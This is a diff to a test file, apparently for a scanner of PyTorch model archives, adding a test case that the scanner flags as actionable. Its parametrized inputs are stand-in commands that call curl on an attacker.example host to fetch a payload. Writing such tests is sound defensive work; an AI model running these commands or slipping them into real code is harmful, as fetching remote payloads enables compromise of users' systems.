@@ -4542,8 +4542,9 @@ def test_pytorch_zip_filters_urls_only_for_clean_pickle_members(
         'f"{client:https://attacker.example/payload}"',
         "'/usr/bin/curl' 'https://attacker.example/payload'",
         "['/usr/bin/curl', 'https://attacker.example/payload']",
+        "cmd='/usr/bin/curl https://attacker.example/payload'",
     ],
-    ids=["shell-pipeline", "f-string-format-dispatch", "adjacent-curl-argv", "list-curl-argv"],
+    ids=["shell-pipeline", "f-string-format-dispatch", "adjacent-curl-argv", "list-curl-argv", "assigned-curl-command"],
 )
 def test_pytorch_zip_keeps_implicit_execution_urls_actionable(
     tmp_path: Path,
